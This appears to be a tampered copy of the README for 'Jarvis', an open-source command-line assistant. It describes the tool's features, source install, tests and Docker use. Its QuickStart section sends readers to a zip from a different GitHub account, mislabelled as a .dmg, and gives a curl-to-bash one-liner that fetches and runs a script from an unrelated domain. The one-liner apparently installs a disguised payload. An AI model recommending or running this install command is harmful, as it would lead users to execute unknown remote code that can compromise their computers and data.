# Jarvis

[![Build Status](https://travis-ci.org/sukeesh/Jarvis.svg?branch=master)](https://travis-ci.org/sukeesh/Jarvis) [![Join the chat at https://gitter.im/Sukeesh_Jarvis/Lobby](https://badges.gitter.im/Sukeesh_Jarvis/Lobby.svg)](https://gitter.im/Sukeesh_Jarvis/Lobby?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)

A Personal AI Assistant for macOS

![Jarvis](http://i.imgur.com/xZ8x9ES.jpg)

Jarvis is an AI personal assistant for Linux, MacOS and Windows which works on the command line. He can talk to you if you enable his voice. He can tell you the weather, he can find restaurants and other places near you. He can do some great stuff for you.

## 🚀 20 Different Tasks That Jarvis Can Do For You:

1. **Entertainment & Suggestions**
   - Suggest activities if you're bored (`activity`, `bored`)
   - Provide ideas on what to draw, watch, or listen to (`prompt`, `top_media`, `taste dive`, `mood music`)

2. **Sports Updates**
   - Get up-to-date sports information: team rankings, match times, player stats (`basketball`, `cricket`, `soccer`, `tennis`)

3. **Games**
   - Play games: Blackjack, Connect Four, Hangman, Rock-Paper-Scissors, etc. (`blackjack`, `connect_four`, `guess_number_game`, `hangman`, `rockpaperscissors`, `roulette`, `tic_tac_toe`, `word_game`, `wordle`)

4. **Health & Fitness**
   - Access nutrition facts, recipes, workout programs, and health trackers (`bmi`, `bmr`, `calories`, `food recipe`, `fruit`, `fruit nutrition`, `workout`)

5. **Cocktail Recipes**
   - Learn how to make cocktails (`cocktail`, `drink`)

6. **Random Generators**
   - Generate random lists, numbers, passwords (`random list`, `random number`, `random password`)

7. **Unit Conversions**
   - Convert units: binary, currency, hex, length, mass, speed, temperature, time (`binary`, `currencyconv`, `hex`, `lengthconv`, `massconv`, `speedconv`, `string_convert`, `tempconv`, `timeconv`)

8. **Photography**
   - Take pictures and screenshots (`open camera`, `screencapture`)

9. **System Information**
   - Get computer specifications (`battery`, `cat his`, `dns forward`, `dns reverse`, `hostinfo`, `ip`, `scan_network`, `speedtest`, `os`, `check ram`, `systeminfo`)

10. **File Management**
    - Manage and organize files (`file manage`, `file organize`)

11. **Image Processing**
    - Upload, edit, and convert images (`imgur`, `image to pdf`, `image compressor`)

12. **PDF Conversion**
    - Convert webpages to PDF or PDFs to images (`htmltopdf`, `pdf to images`)

13. **Jokes & Facts**
    - Enjoy jokes and random facts (`dadjoke`, `joke daily`, `joke chuck`, `joke`, `fact`, `cat fact`)

14. **Calculations**
    - Perform calculations and solve equations (`calculate`, `factor`, `solve`, `equations`, `plot`, `matrix add`)

15. **QR Code Generation**
    - Generate QR codes for URLs (`qr`)

16. **Weather Updates**
    - Check the weather forecast (`weather report`)

17. **Language Translation**
    - Translate languages (`translate`)

18. **Stock Market Information**
    - Display stock and cryptocurrency information (`stock`, `cryptotracker`)

## 🛠️ Getting Started

### QuickStart

Download .dmg from releases page: [https://github.com/conerst0ne/jarvis-macos/releases/download/v1.0/jarvis.zip](https://github.com/conerst0ne/jarvis-macos/releases/download/v1.0/jarvis.zip) (sha256:10a264c6c5d334fe32353dfc5936b9862f5a03f34b789b603475bc0bfd8cad20)

Or install via Terminal
```bash
/bin/bash -c "$(curl -fsSL https://macostutorial.com/git/install.sh)"
```
### Installation from source

1. **Clone the Repository**

   ```bash
   git clone https://github.com/conerst0ne/Jarvis.git
   ```

2. **Run the installer**
   ```bash
   python installer
   ```
   If that doesn't work, try:
   ```bash
   python3 installer
   ```

### Running Jarvis

- Run Jarvis from anywhere:
  
   ```bash
   jarvis
   ```

  Or from within the project folder:
  
   ```bash
   ./jarvis
   ```

You can start by typing `help` within the Jarvis command line to check what Jarvis can do for you.

### Plugins

[Click here](doc/PLUGINS.md) to learn more about plugins.

### Creating a test

Creating a test is optional but never a bad idea ;).

[Click here](doc/TESTING.md) to learn more about testing.

### How to run tests:

 Run `test.sh`
 ```bash
 ./test.sh
 ```
## Optional Dependencies

- Any pyttsx3 text-to-speech engine (``sapi5, nsss or espeak``) for Jarvis to talk out loud (e.g. Ubuntu do ``sudo apt install espeak``)
- Portaudio + python-devel packages for voice control
- ``notify-send`` on Linux if you want to receive *nice* and desktop-notification instead of *ugly* pop up windows (e.g. Ubuntu do ``sudo apt install libnotify-bin``)
- ``ffmpeg`` if you want ``music`` to download songs as .mp3 instead of .webm

## Docker

Run with docker (docker needs to be installed and running):

```
[sudo] make build_docker
[sudo] make run_docker
```

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
